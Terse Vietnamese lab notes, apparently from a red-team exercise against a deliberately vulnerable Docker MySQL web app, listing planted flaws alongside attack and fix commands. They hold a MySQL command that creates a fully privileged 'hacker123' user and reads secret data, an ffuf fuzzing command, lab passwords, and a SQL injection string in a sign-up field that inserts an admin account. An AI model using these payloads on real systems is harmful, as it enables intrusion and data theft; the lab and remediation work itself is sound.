5000: cho redteam tấn côngn
5001: dã dc fix nhưng tấn công PE vẫn không fix cái đó phải fix trực tiếp ( lên demo fix trược tiếp) tiếp trước thì nó bị bên redteam ko tấn công dc
5002: xem log 

tấn công PE:
docker exec -it mysql_vuln mysql -u app_user -papp123 -e "CREATE USER 'hacker123'@'%' IDENTIFIED BY 'hack123'; GRANT ALL PRIVILEGES ON *.* TO 'hacker123'@'%' WITH GRANT OPTION; SHOW GRANTS FOR 'hacker123'@'%'; SELECT * FROM company_db.secret_data;"
fix:
ocker exec -it mysql_vuln mysql -u root -proot123 -e "DROP USER IF EXISTS 'hacker123'@'%';"
Get-Content sql/patch.sql | docker exec -i mysql_vuln mysql -u root -proot123
docker exec -it mysql_vuln mysql -u app_user -papp123 -e "SHOW GRANTS;"
docker exec -it mysql_vuln mysql -u root -proot123 -e "SELECT user FROM mysql.user WHERE user='hacker123';"

Hoặc mở DBeaver kết nối vô

Hiện tại đg có :
SQL 2 chổ 
PE 2 chổ
File upload
misconfig (C:\Windows\System32\ipconfig.exe) xem ip và vô fuff (ffuf -u http://192.168.204.1:5000/FUZZ.php -w /usr/share/wordlists/dirb/common.txt )


đăng ký :  ', '', '', 'admin', 99999)#
INSERT INTO employees (username, email, password, role, salary)
VALUES ('', '', '', 'admin', 99999)#', '123456', 'user', 0)